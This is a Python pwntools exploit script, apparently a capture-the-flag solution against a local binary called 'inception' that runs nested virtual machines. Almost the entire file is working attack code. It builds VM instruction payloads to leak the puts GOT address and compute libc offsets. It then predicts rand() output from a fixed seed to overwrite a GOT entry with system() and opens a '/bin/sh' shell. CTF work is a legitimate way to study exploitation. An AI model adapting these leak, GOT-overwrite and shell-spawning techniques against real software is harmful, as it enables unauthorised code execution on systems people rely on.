from pwn import *
from ctypes import *
 
p = process('./files/inception')
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(0x31337)
 
def parse_vm(op,arg0,arg1,arg2):
    payload = p8(op)
    payload += '\x02'
    payload += p8(0x20) #type
    payload += p8(arg0) #regi_idx
    payload += '\x00'
    payload += p8(0x21) #type
    payload += p8(arg1) #regi_idx |
    payload += p8(arg2) #regi_idx >>
    return payload
 
def read_str(data):
    p.send(p32(len(data)))
    sleep(0.5)
    p.send(data)
 
def input_vm1(ins):
    p.send('\x01')
    p.recvline()
    read_str(ins)
def vm1_setread():
    return '\x0c\x00\xf4\x00'
 
def vm1_setwrite():
    return '\x0b\x00\xf4\x00'
 
def parse_vm2(op,arg1,arg5,arg6,arg10):
    arg4 = p8(0)
    arg3 = p8(arg1 / 0x10000)
    arg2 = p8((arg1 % 0x10000)/0x100)
    arg1 = p8((arg1 % 0x100))
 
    arg9 = p8(0)
    arg8 = p8(arg6 / 0x10000)
    arg7 = p8((arg6 % 0x10000)/0x100)
    arg6 = p8((arg6 % 0x100))
 
    payload = p8(op) + arg1 + arg2 + arg3 + arg4 + p8(arg5)
    payload += arg6 + arg7 + arg8 + arg9 + p8(arg10)
    return payload
 
def input_vm2(payload):
    read_str(payload)
    sleep(2)
    p.send('\x02')
 
def parse_vm3(op,arg0,arg1,arg3):
    arg0 = (arg0 >> 8)
    payload = p8(op) + p8(arg0)
    arg2  = (arg1>>8)
    arg1 -= arg2
    payload += p8(arg1) + p8(arg2)
    arg4 = (arg3>>8)
    arg3 -= arg4
    payload += p8(arg3) + p8(arg4)
    return payload
 
print p.recvline()
 
set_ = parse_vm(0x89,0x7,0x0,0x6) #mov
input_vm1(set_+vm1_setread())
read_str('/bin/sh\x00'*0x10) #FUCK ..
 
set_ = parse_vm(0x89,0x7,0x0,0x6) #mov
set_ += parse_vm(0x89,0x0,0x10,0x0) #mov write_len_set
input_vm1(set_+vm1_setread())
sleep(1)
payload = parse_vm2(0xb4,0x1,0x20,0x900,0x21) #reg[1] = 0
payload += parse_vm2(0x28,0xa,0x20,0x700,0x21) #reg[0xa] = 0x700
payload += parse_vm2(0xb4,0x9,0x20,0x7000,0x21) #reg[9] = 0
payload += parse_vm2(0xb4,0x9,0x20,0x100e0,0x21) #reg[9] = -0x100e0 #puts@got idx
payload += parse_vm2(0x28,0xb,0x20,0x10,0x21) #unk_225138 cpy_len arg = 0x10
payload += parse_vm2(0x20,0x8,0x22,0x1,0x20) #pop
payload += parse_vm2(0x20,0xc,0x22,0x1,0x20) #pop
payload += parse_vm2(0x85,0x01,0x20,0x1,0x21) #cpy flag_set
payload += parse_vm2(0x83,0x01,0x20,0x1,0x21) #return 0
sleep(1)
input_vm2(payload)
set_ = parse_vm(0x1,0x7,0x0,0x2)
input_vm1(set_+vm1_setwrite())
p.recvuntil('A')
print p.recv(1024)
print p.recv(20).encode('hex')
puts = u64(p.recv(8))
libc_base = puts - 0x6f690
memcpy = libc_base + 0x14dea0
system = libc_base + 0x45390
count = [0]*3
target = [0]*3
target[0] = ((system&0xff))
target[1] = ((system&0xff00)>>8)
target[2] = ((system&0xff0000)>>16)
sort = []
for i in range(0,0x10000):
    if(len(sort)<3):
        random = libc.rand()&0xff #byte
        if(target[0]==random and count[0]<1):
            count[0] = i
            print 'FIND {}'.format(target[0])
            sleep(3)
            sort.append(0)
        if(target[1]==random and count[1]<1):
            count[1] = i
            print 'FIND {}'.format(target[1])
            sleep(3)
            sort.append(1)
        if(target[2]==random and count[2]<1):
            count[2] = i
            print 'FIND {}'.format(target[2])
            sleep(3)
            sort.append(2)
    else:
        break
print hex(memcpy)
print hex(system)
print 'target > {}'.format(target)
print 'randCount > {}'.format(count)
print 'Sort > {}'.format(sort)
 
 
p.recv(1024)
gdb.attach(p)
 
set_ = parse_vm(0x89,0x7,0,0x6)
input_vm1(set_+vm1_setread())
payload = parse_vm2(0x28,0x7,0x20,(0x700-0x30),0x21)
payload += parse_vm2(0xdb,0x1,0x20,0x1,0x21)
payload += parse_vm2(0x83,0x1,0x20,0x1,0x21)
payload += 'A'*15+'B'*0x2d0+'/bin/sh\x00'
input_vm2(payload)
 
set_ = parse_vm(0x89,0x7,0,0x6)
input_vm1(set_+vm1_setread())
payload = parse_vm2(0x28,0x7,0x20,0x5f0,0x21)
payload += parse_vm2(0xdb,0x01,0x20,0x1,0x21)
payload += parse_vm2(0x83,0x01,0x20,0x1,0x21)
payload += '\x83'*(0x100-len(payload))
 
vm3_p = parse_vm3(0x1,0x6500,0x3,0x0)
 
 
for i in range(3):
    if(i == 0):
        target = (count[sort[i]] + 0x1)
    else:
    
        target = (count[sort[i]] - count[sort[i-1]])
    vm3_p += parse_vm3(0x1,0x6500,0xb,0x0)
    vm3_p += parse_vm3(0x3,0x6500,0xb,(0x58-sort[i]))
    for i in range(target):
        vm3_p += parse_vm3(0x15,0x6500,0x1,0x1)
 
vm3_p += parse_vm3(0xc,0x6500,0x1,0x1) #call system('/bin/sh')
vm3_p += parse_vm3(0xb,0x6500,0x1,0x1) #return 0
 
payload += vm3_p
print len(payload)
input_vm2(payload)
p.recv(1024)
p.send('\x03')
###VM3 GOT -> SYSTEM ###
 
 
 
 
p.interactive()